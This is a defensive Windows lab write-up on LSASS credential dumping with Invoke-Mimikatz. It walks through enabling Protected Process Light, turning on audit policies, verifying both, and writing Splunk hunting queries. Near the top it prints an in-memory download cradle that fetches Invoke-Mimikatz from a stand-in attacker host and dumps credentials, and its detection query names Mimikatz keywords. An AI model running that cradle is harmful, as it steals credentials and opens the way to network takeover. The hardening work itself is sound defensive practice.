# Technique 06 — Credential Dumping with Invoke-Mimikatz
## Lab Documentation | Windows 10 Pro
**MITRE:** T1003.001 | **Severity:** Critical | **Status:** Fully Mitigated

---

## What This Attack Does

Mimikatz is a tool that extracts Windows credentials directly from the LSASS
(Local Security Authority Subsystem Service) process in memory. LSASS handles
authentication and keeps credentials cached — plaintext passwords, NTLM hashes,
and Kerberos tickets — for every user currently logged in.

The PowerShell delivery method uses a download cradle to fetch and run Mimikatz
entirely in memory:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
```

The output is every credential on that machine. If a domain admin is logged in,
the attacker now owns the entire network. No files touch disk — the attack
happens entirely in RAM.

**Why this technique matters most in real attacks:**
Credential dumping is the pivot point between initial access and full domain
compromise. Every major ransomware incident and APT campaign involves this step.

---

## What Was Already Blocking This

Controls from previous techniques already neutralise the Mimikatz delivery chain:

```
Control                 Applied In    What It Blocks
──────────────────────────────────────────────────────
CLM blocks Net.WebClient   T03       Cannot fetch Invoke-Mimikatz.ps1
CLM blocks IEX             T03       Cannot execute downloaded script
Firewall blocks PS outbound T03      Cannot reach attacker's server
Script Block Logging        T02      Logs any attempt in Event 4104
```

What T06 adds: protection at the **LSASS process level itself**. Even if an
attacker delivers Mimikatz through a compiled executable, a different scripting
language, or a physical attack — LSASS is protected at the kernel level.

---

## Before — Attack Surface (Baseline)

Command run (normal PowerShell):
```powershell
$lsass = Get-Process -Name lsass
Write-Host "LSASS PID: $($lsass.Id)"
Write-Host "LSASS Path: $($lsass.Path)"
```

Result:
```
LSASS PID: 832
LSASS Path:
```

LSASS PID is visible and the process is reachable as a standard process
object. The empty path is expected for standard users — but the PID
being accessible confirms LSASS can be found and targeted by an attacker
process running with admin rights.

On an unprotected system, a Mimikatz-equivalent process with admin rights
can open a handle to LSASS memory and read credentials freely.

![Before — LSASS visible and reachable](screenshots/T06/01_before_lsass_visible.png)

---

## Fix 1 — Enable LSASS Protected Process Light (PPL)

Run as Administrator:

```powershell
Set-ItemProperty `
  -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
  -Name "RunAsPPL" `
  -Value 1 `
  -Type DWord
```

Verify written correctly:
```powershell
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" | Select-Object RunAsPPL
```

Expected: `RunAsPPL : 1`

**What PPL does:** Makes LSASS a protected process at the kernel level.
Protected processes can only be accessed by other protected processes signed
by Microsoft. Mimikatz and any other unsigned tool cannot open a handle to
LSASS memory — they get access denied before reading a single byte of
credential data.

**Why a reboot is required:** LSASS starts during Windows boot before any
user logs in. The PPL flag is read at that point. Changing the registry
mid-session has no effect on the already-running LSASS — only the next
boot picks up the new protection level.

![Fix 1 — RunAsPPL = 1 written and verified](screenshots/T06/02_runasppl_set.png)

---

## Fix 2 — Enable LSASS Access Auditing

Run as Administrator:

```powershell
auditpol /set /subcategory:"Kernel Object" /success:enable /failure:enable
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
```

Verify both:
```powershell
auditpol /get /subcategory:"Kernel Object"
auditpol /get /subcategory:"Credential Validation"
```

Expected:
```
Kernel Object             Success and Failure
Credential Validation     Success and Failure
```

**What these generate:**

| Event ID | Trigger | What It Shows |
|----------|---------|---------------|
| 4656 | Process requested a handle to LSASS | Access attempt — who tried to open LSASS |
| 4663 | Process accessed the LSASS object | What access level was granted or denied |
| 4776 | Credential validation attempt | Pass-the-hash detection after credential theft |

Even with PPL blocking the actual memory read, the access attempt is still
logged. A SOC analyst sees who tried to touch LSASS and when.

![Fix 2 — Kernel Object and Credential Validation auditing enabled](screenshots/T06/03_audit_policies_enabled.png)

---

## VM Snapshot Before Reboot

Before rebooting to apply PPL:

```
VMware → VM menu → Snapshot → Take Snapshot
Name: Before-T06-Reboot
```

This preserves the pre-reboot state. If anything goes wrong during boot with
PPL active, you can revert to this snapshot.

---

## After — Verification Post-Reboot

After rebooting, run all three verification commands as Administrator:

### Test 1 — Confirm PPL persisted through reboot

```powershell
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" | Select-Object RunAsPPL
```

Result: `RunAsPPL : 1` — confirmed.

### Test 2 — Try to read LSASS modules (requires memory handle)

```powershell
(Get-Process -Name lsass).Modules
```

Result: (empty — no output, no error)

Under PPL, Windows silently restricts the handle rather than throwing a
loud access denied. The process object remains visible but its memory is
inaccessible. Mimikatz hitting this same wall returns nothing — no
credentials can be extracted.

**Note:** The silent empty response is correct PPL behaviour. It is not
an error. PPL denies the handle at the kernel level before the Modules
property can be populated.

### Test 3 — Confirm Kernel Object auditing persisted

```powershell
auditpol /get /subcategory:"Kernel Object"
```

Result: `Kernel Object → Success and Failure` — confirmed.

![After — PPL active, LSASS modules empty, auditing confirmed](screenshots/T06/04_verification_post_reboot.png)

---

## Full Defence Architecture for T06

```
Attacker attempts credential dump
         │
         ▼
┌─────────────────────────────────────┐
│  Layer 1 — CLM + Firewall (T03)     │
│  Download cradle blocked            │
│  Net.WebClient cannot be created   │
│  Invoke-Mimikatz.ps1 never fetched │
└─────────────────────────────────────┘
         │ (if delivered via executable instead)
         ▼
┌─────────────────────────────────────┐
│  Layer 2 — LSASS PPL (T06)          │
│  RunAsPPL = 1                       │
│  LSASS is a protected process       │
│  Handle request → access denied     │
│  No credentials extracted           │
└─────────────────────────────────────┘
         │ (attempt still visible)
         ▼
┌─────────────────────────────────────┐
│  Layer 3 — Audit Logging (T06)      │
│  Event 4656: handle requested       │
│  Event 4663: access attempted       │
│  Event 4776: credential use tracked │
│  SOC analyst sees the attempt       │
└─────────────────────────────────────┘
```

---

## Key Learning — PPL Silent Denial vs Access Denied

During verification, `(Get-Process -Name lsass).Modules` returned empty
instead of throwing an explicit `Access is denied` error.

This is intentional PPL behaviour:
- Windows grants a restricted handle that lacks `PROCESS_VM_READ` permission
- The Modules property requires reading process memory to enumerate
- With the permission denied at kernel level, the enumeration returns empty
- No exception is raised — the handle itself is valid but limited

In a real Mimikatz run against PPL-protected LSASS, the tool returns:
```
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```
Error code `0x00000005` = `ERROR_ACCESS_DENIED`. Same kernel-level block,
surfaced differently depending on how the tool handles the error.

---

## Registry Values Written

| Path | Name | Type | Value |
|------|------|------|-------|
| `HKLM:\SYSTEM\CurrentControlSet\Control\Lsa` | RunAsPPL | REG_DWORD | 1 |

---

## Audit Policies Enabled in T06

| Subcategory | Setting | Key Event IDs |
|-------------|---------|---------------|
| Kernel Object | Success and Failure | 4656, 4663 |
| Credential Validation | Success and Failure | 4776 |

---

## SOC Threat Hunting Notes

**Splunk detection query (future implementation):**

LSASS handle requests:
```
source="WinEventLog:Security" EventCode=4656
ObjectName="*lsass*"
```

LSASS access attempts:
```
source="WinEventLog:Security" EventCode=4663
ObjectName="*lsass*"
```

Pass-the-hash detection:
```
source="WinEventLog:Security" EventCode=4776
| where Status != "0x0"
```

Script block evidence:
```
source="WinEventLog:Microsoft-Windows-PowerShell/Operational"
EventCode=4104
(ScriptBlockText="*Mimikatz*" OR ScriptBlockText="*DumpCreds*"
OR ScriptBlockText="*sekurlsa*" OR ScriptBlockText="*lsadump*")
```

---

## MITRE ATT&CK Mapping

| Field | Value |
|-------|-------|
| Technique | T1003.001 — OS Credential Dumping: LSASS Memory |
| Tactic | Credential Access |
| Detection | Event ID 4656 (LSASS handle requested) |
| Detection | Event ID 4663 (LSASS object accessed) |
| Detection | Event ID 4776 (credential validation) |
| Detection | Event ID 4104 (Mimikatz in script block) |
| Reference | https://attack.mitre.org/techniques/T1003/001/ |

---

## Screenshot Folder Structure

```
evidence/
└── T06/
    ├── 01_before_lsass_visible.png
    ├── 02_runasppl_set.png
    ├── 03_audit_policies_enabled.png
    └── 04_verification_post_reboot.png
```

---

*Lab environment: Windows 10 Pro · VMware · Standalone VM · No Domain*
*Date: [date of lab session]*
